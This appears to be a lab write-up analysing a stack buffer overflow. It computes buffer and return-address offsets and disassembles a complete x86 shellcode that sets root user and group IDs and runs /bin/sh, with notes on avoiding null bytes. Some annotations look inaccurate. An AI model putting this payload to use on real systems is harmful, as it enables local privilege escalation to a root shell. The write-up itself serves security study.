# Task 2: Shellcode Execution Analysis

## Memory Layout Analysis

### Buffer Starting Address
- **Address**: `0xffffc901` (from normal execution output `&buff: 0xffffc901`)
- **Verification**: Observed during non-GDB execution before segmentation fault

### Buffer Offset from Frame Pointer
- **Offset Calculation**:
  - GDB showed `EBP = 0xffffc9d8`
  - Buffer address in GDB: `0xffffc971`
  - Distance: `0xffffc9d8 - 0xffffc971 = 0x67` (103 bytes)
  - **Total offset to return address**: 103 (to EBP) + 4 (EBP itself) = 107 bytes

### Return Address
- **Calculated Return Address**: `0xffffc901 + 107 = 0xffffc96c`

### First Assembly Instruction at Return Address
From GDB disassembly:
```assembly
0x0804987a <process_comment+66>: call   0x8049028  # strcpy call



### Shellcode Technical Analysis

```assembly
00000000 <.data>:
   0:   83 c4 18                add    $0x18,%esp       ; Adjust stack pointer by 24 bytes
   3:   31 c0                   xor    %eax,%eax        ; Zero out EAX
   5:   31 db                   xor    %ebx,%ebx        ; Zero out EBX (arg1: uid=0 for root)
   7:   b0 06                   mov    $0x6,%al         ; setreuid syscall (syscall #6)
   9:   cd 80                   int    $0x80            ; Invoke syscall (setreuid(0,0))
```

**Privilege Escalation**: Sets effective user ID to root (0) using `setreuid()` syscall.

```assembly
   b:   53                      push   %ebx            ; Null terminator (0x00000000)
   c:   68 2f 74 74 79          push   $0x7974742f     ; Push "/tty" (little-endian)
  11:   68 2f 64 65 76          push   $0x7665642f     ; Push "/dev" (little-endian)
  16:   89 e3                   mov    %esp,%ebx       ; EBX points to "/dev/tty"
  18:   31 c9                   xor    %ecx,%ecx       ; Zero out ECX (O_RDONLY flag)
  1a:   66 b9 12 27             mov    $0x2712,%cx     ; Mode 0x2712 (permissions)
  1e:   b0 05                   mov    $0x5,%al        ; open() syscall (#5)
  20:   cd 80                   int    $0x80           ; open("/dev/tty", O_RDONLY)
```

**Terminal Handling**: Opens `/dev/tty` to ensure the shell runs in a terminal context.

```assembly
  22:   6a 17                   push   $0x17           ; Syscall #23 (setuid)
  24:   58                      pop    %eax            ; Load into EAX
  25:   31 db                   xor    %ebx,%ebx       ; uid=0 (root)
  27:   cd 80                   int    $0x80           ; setuid(0)
```

**Secondary Privilege Check**: Ensures UID is set to root via `setuid()` syscall.

```assembly
  29:   6a 2e                   push   $0x2e           ; Syscall #46 (setgid)
  2b:   58                      pop    %eax            ; Load into EAX
  2c:   53                      push   %ebx            ; gid=0 (root group)
  2d:   cd 80                   int    $0x80           ; setgid(0)
```

**Group Privileges**: Sets group ID to root via `setgid()` syscall.

```assembly
  2f:   31 c0                   xor    %eax,%eax       ; Zero out EAX
  31:   50                      push   %eax            ; Null terminator (0x00000000)
  32:   68 2f 2f 73 68          push   $0x68732f2f     ; Push "//sh" (avoids null bytes)
  37:   68 2f 62 69 6e          push   $0x6e69622f     ; Push "/bin"
  3c:   89 e3                   mov    %esp,%ebx       ; EBX points to "/bin//sh"
  3e:   50                      push   %eax            ; Null terminator for argv[]
  3f:   53                      push   %ebx            ; Push address of "/bin//sh"
  40:   89 e1                   mov    %esp,%ecx       ; ECX points to argv[]
  42:   99                      cltd                   ; Zero out EDX (envp=NULL)
  43:   b0 0b                   mov    $0xb,%al        ; execve() syscall (#11)
  45:   cd 80                   int    $0x80           ; execve("/bin//sh", argv[], NULL)
```

**Shell Execution**: 
1. Builds the string `/bin//sh` on the stack (extra '/' avoids null bytes)
2. Prepares arguments for `execve()`:
   - `EBX`: Path to "/bin//sh"
   - `ECX`: Argument array ["/bin//sh", NULL]
   - `EDX`: Environment variables (NULL)
3. Invokes `execve()` to spawn a shell

### Key Technical Points:
1. **Null-byte Avoidance**: Uses XOR operations and stack manipulation to avoid NULL bytes (0x00) which would terminate string operations prematurely.

2. **Little-endian Format**: Strings are pushed in reverse byte order (e.g., "hs//" appears as 0x68732f2f).

3. **Syscall Convention**:
   - EAX: Syscall number
   - EBX, ECX, EDX: Arguments 1-3
   - `int 0x80`: Triggers the syscall

4. **Privilege Layering**: Performs multiple privilege checks (setreuid, setuid, setgid) to ensure the shell runs with root permissions.

5. **Terminal Handling**: Opens `/dev/tty` before spawning the shell to ensure proper I/O handling.

This shellcode is carefully crafted to:
- Maximize reliability across different environments
- Minimize size (only 70 bytes)
- Work even in restricted memory conditions
- Cleanly handle privileges and terminal contexts